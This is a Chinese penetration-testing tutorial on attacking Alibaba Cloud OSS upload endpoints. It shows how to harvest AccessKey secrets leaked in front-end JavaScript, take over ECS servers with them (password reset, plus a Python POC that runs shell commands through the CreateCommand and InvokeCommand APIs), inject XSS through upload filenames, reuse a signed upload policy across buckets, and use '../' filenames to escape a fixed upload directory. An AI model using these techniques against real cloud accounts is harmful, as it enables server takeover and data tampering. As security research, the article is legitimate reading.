## **0x00 前言**

OSS渗透目前最常见的方式就是得到Secret Key，那么如果Secret Key并没有被泄露难道就不可以被利用了吗？答案是否定的。

自笔者上篇文章末尾的“全域名”泛滥后，笔者来给大家通过官方给出的API代码分析的方式分析一下Secret
Key的复用问题，因为在这里，某里云官方给的demo同样是存在此问题的。

##  **0x01 环境布局**

在这里，笔者准备了一个购买了ECS的账号来跟大家进行演示。这个账号的资产为：

###
一台ECS![](https://image.3001.net/images/20211108/1636369394_618903f24b6c40b1aec1b.png!small)

###
两台OSS![](https://image.3001.net/images/20211108/1636369413_61890405ec5b5f235a09f.png!small)

##  **0x02 常见姿势总结**

在真正的实战中，遇到我们喜爱的上传点时，我们会发现类似于如下HTTP请求：

![](https://image.3001.net/images/20211110/1636506425_618b1b39120645e6e9dfc.png!small)  

当Options请求完毕后会发现一个上传包，并且携带了key：![](https://image.3001.net/images/20211108/1636369453_6189042d89c88dd9fa69d.png!small)

那么此时已经可以确定为OSS上传点。

针对于类似于这种的包，我们会第一时间去翻看网站所引入的所有JavaScript外联，去查看是否在前端泄露了Secret Key。

在这里笔者先给大家简单的叙述一下查找到Secret Key意味着什么。

> Access Key可以看作是阿里云的另一种账户密码。  
> OSS，ECS等等是阿里云账户下的产品，  
> 当这个账户下有OSS产品，我们就可以用accesskey访问这个oss，  
> 如果这个账户下有ECS，我们就能通过这个accesskey去操控ecs，执行命令。

在这里为了方便演示，我们首先将两台服务器设置跨域请求：![](https://image.3001.net/images/20211108/1636369484_6189044c05193c978aa4f.png!small)

然后创建规则：![](https://image.3001.net/images/20211108/1636369498_6189045a7add78638be33.png!small)

下面笔者创建一个实战模拟代码

源代码来自：https://files.cnblogs.com/files/ossteam/oss-h5-upload-js-direct.tar.gz

参考：[
_https://www.cnblogs.com/ossteam/p/4942227.html_](https://www.cnblogs.com/ossteam/p/4942227.html)  

### 情况一：Secret Key 泄露

使用F12进行搜索Secret
Key：![](https://image.3001.net/images/20211108/1636369524_618904744e6b40347aaba.png!small)

这是实战中一个典型的Secret Key泄露，也是能让大家眼前一亮的信息，那么我们下一步应该怎么做呢？

### 使用 oss-browser 来进行管理 oss 服务器

下载地址：[ _http://gosspublic.alicdn.com/oss-browser/1.9.4/oss-browser-win32-x64.zip_](http://gosspublic.alicdn.com/oss-browser/1.9.4/oss-browser-win32-x64.zip)![](https://image.3001.net/images/20211108/1636369544_6189048889902a6bec8d8.png!small)

在这里我们只需要将阿里云的AccessKeyId与AccessKeySecret填入就可以了。![](https://image.3001.net/images/20211108/1636369559_61890497860278618692b.png!small)

这里我们就可以对这两台OSS服务器进行增删改查操作。

### 使用行云管家进行重置ECS密码信息

当然如果只可以管理两台静态服务器，那么这点权限也太小了，我们可以通过行云管家来进行管理ECS。

登陆行云管家：[
_https://yun.cloudbility.com/_](https://yun.cloudbility.com/)![](https://image.3001.net/images/20211108/1636369583_618904af450c00c063c7f.png!small)

填入Access Key ID 与 Access Key Secret
即可接管ECS服务器。![](https://image.3001.net/images/20211108/1636369598_618904be41257d8b8b3c4.png!small)

导入成功后这里可以重置系统密码。![](https://image.3001.net/images/20211108/1636369619_618904d3bce89c346c9dd.png!small)

重置后ssh登录：![](https://image.3001.net/images/20211110/1636506510_618b1b8e9e4be75cf96ff.png!small)

登录成功，但是显然这种非常大的动静并不是我们想要的。那么我们则需要使用OpenApi来实现命令执行。

### 使用OpenApi来进行命令执行

在OpenApi官网：[ _https://api.aliyun.com/_](https://api.aliyun.com/)中，存在
CreateCommand 与 InvokeCommand Api，我们可以借用这两个来实现命令执行。

参考文章：[
_https://www.cnblogs.com/J0ng/p/13210147.html_](https://www.cnblogs.com/J0ng/p/13210147.html)  

只不过这些步骤太麻烦了，不如编写为POC来进行本地调用。

下面是笔者做好的POC：

> #!/usr/bin/env python
>
> #coding=utf-8
>
> import json, base64
>
> from aliyunsdkcore.client import AcsClient
>
> from aliyunsdkcore.acs_exception.exceptions import ClientException
>
> from aliyunsdkcore.acs_exception.exceptions import ServerException
>
> from aliyunsdkecs.request.v20140526.CreateCommandRequest import
> CreateCommandRequest
>
> from aliyunsdkecs.request.v20140526.InvokeCommandRequest import
> InvokeCommandRequest
>
> ID = '' # Access Id
>
> KEY = '' # Access Key
>
> reGon = '' # 地区
>
> InstanceId = [""] # 实例ID
>
> CmdBytes = b'''ls /
>
> '''# 要执行的命令
>
> Cmd = base64.b64encode(CmdBytes).decode('utf-8')
>
> CmdType = "RunShellScript"
>
> # RunBatScript：创建一个在Windows实例中运行的 Bat 脚本。
>
> # RunPowerShellScript：创建一个在Windows实例中运行的PowerShell脚本。
>
> # RunShellScript：创建一个在Linux实例中运行的Shell脚本。
>
>  
>
>
> client = AcsClient(ID, KEY, reGon)
>
> request = CreateCommandRequest()
>
> request.set_accept_format('json')
>
> request.set_Name("123123")
>
> request.set_Type("RunShellScript")
>
> request.set_CommandContent(Cmd)
>
> response = client.do_action_with_exception(request)
>
> print(str(response, encoding='utf-8'))
>
> request2 = InvokeCommandRequest()
>
> request2.set_accept_format('json')
>
> request2.set_CommandId((json.loads(response))['CommandId'])
>
> request2.set_InstanceIds(InstanceId)
>
> response = client.do_action_with_exception(request2)
>
> print(str(response, encoding='utf-8'))

只需要简单配置一下就可以了，配置如图：![](https://image.3001.net/images/20211108/1636369668_61890504e222b1aa55253.png!small)

配置好之后进行执行：![](https://image.3001.net/images/20211108/1636369686_61890516086bfa419cfb6.png!small)

可以从云管理这边看到所执行的命令。

PS: 如果使用POC的方式注意安装Python库：

> pip3 install aliyun-python-sdk-core-v3
>
> pip3 install aliyun-python-sdk-cdn
>
> pip3 install aliyun-python-sdk-ecs

### 情况二：Secret Key 没有泄露

 **毫无卵用的XSS**

既然OSS可以上传任意mime类型，那么我们可以直接上传text/html来进行XSS操作，如图：

参考文章：[
_http://pirogue.org/2017/09/29/aliyunoss/_](http://pirogue.org/2017/09/29/aliyunoss/)  

不知为何，笔者这里复现失败，就不去尝试了。

 **根据上传点的回显来构造XSS**

这也是笔者看到的另一种场景，也就是说，当你上传“1.jpg<script>alert(1)</script>”之后，随后输出在页面上，从而导致XSS，笔者这里也不进行复现了。

参考文章：[
_https://www.freebuf.com/vuls/288206.html_](https://www.freebuf.com/vuls/288206.html)  

##  **0x03 无需SecretKey的利用方法**

好了，总结以上需要SecretKey的攻击手法后，我们再来看一下笔者今天想要说的“无需SecretKey”的利用方式。

根据以上种种案例迹象表明，只有当我们拿到SecretKey后才可以进行更危险的操作。

但是我们根据官方提供的PHP上传API来探究，事情到底是不是得有SecretKey才可以进行利用。

开发人员对待OSS的三种情况：

### 通过JavaScript直接进行上传

绘图如下：![](https://image.3001.net/images/20211108/1636369727_6189053f335c70f3fdec0.png!small)

当然这种方式是最危险的，在前面也讲过利用方式了。

### 通过Json轮询的方式来进行直接上传

这种方式是笔者见过开发者最多的一种方式，也是某云推荐的使用方式，咱们先看一下例图再进行挖掘它其中的问题。![](https://image.3001.net/images/20211108/1636369745_618905515275527b0c0bc.png!small)

### 通过服务器单条线路直接上传

这种方式也是最安全的方式了，大致如下：![](https://image.3001.net/images/20211108/1636369773_6189056de57911676c776.png!small)

在前面的图中我们也看到了，轮询的方式也是一种比较推荐的方式哈，只不过，这个服务器返回给我们的“密钥”到底是什么，我们还真不清楚。

### 分析问题

那么我们查看官方文档：![](https://image.3001.net/images/20211108/1636369791_6189057feed61dc410dcb.png!small)

那么笔者下载下来之后进行分析源代码：![](https://image.3001.net/images/20211108/1636369808_618905900459fe14f61cd.png!small)

我们可以看到，ID字段未经任何处理就拼接到了返回包中，signature存放了“密钥能存活多久”的key以及AccessSecretKey，将它们进行sha1加密，可以发现，host确确实实的是一动不动的，该密钥与Host没有一点关系。

那么我们可以猜想：这条密钥就是为了短暂的使用一下AccessKey，过期不候。

那么如果一个人有多台OSS呢？这条密钥是否可以复用。

那么我们捕获该php文件的返回结果，我们观察一下policy的base64解码值，如图：![](https://image.3001.net/images/20211108/1636369824_618905a092ec4a7d3526b.png!small)

policy值：

>
> JTdCJTIyZXhwaXJhdGlvbiUyMiUzQSUyMjUxOTAtMDktMjNUMjAlM0ExNyUzQTI0LjAwMFolMjIlMkMlMjJjb25kaXRpb25zJTIyJTNBJTVCJTVCJTIyY29udGVudC1sZW5ndGgtcmFuZ2UlMjIlMkMwJTJDMTA0ODU3NjAwMCU1RCUyQyU1QiUyMnN0YXJ0cy13aXRoJTIyJTJDJTIyJTI0a2V5JTIyJTJDJTIydXNlci1kaXItcHJlZml4JTVDLyUyMiU1RCU1RCU3RA==

Base解密：![](https://image.3001.net/images/20211108/1636369845_618905b58088a3f803f1a.png!small)

那么我们使用它们对tester1服务器进行文件上传操作：![](https://image.3001.net/images/20211108/1636369860_618905c4dc8c51b3f3297.png!small)

可以看到，成功上传，那么我们将目标改为tester2，看返回结果：

![](https://image.3001.net/images/20211108/1636369874_618905d2c7676c9bee6fe.png!small)

可以看到，同一份密钥是可以上传多个服务器的。

### 利用场景

根据笔者所发布的《记一次授权导致的全域名沦陷》：[
_https://www.freebuf.com/vuls/303620.html_](https://www.freebuf.com/vuls/303620.html)，例图可以为：![](https://image.3001.net/images/20211108/1636369893_618905e537981e3ecdefa.png!small)

### 简单的过滤绕过：

如果手上已经持有了密钥，通过这次实验，则可以向该KeyId使用者的任意OSS服务器上传任意文件，只不过这里还有一点，有些上传点是必须要指明目录的，例如：![](https://image.3001.net/images/20211108/1636369915_618905fb411184a66ff59.png!small)

则key只能为Temp下的，但是我们可以生成带有../的文件名，如图：![](https://image.3001.net/images/20211108/1636369930_6189060ad373c335c24d9.png!small)

这样依然可以生成凭据，从而进行任意目录上传。

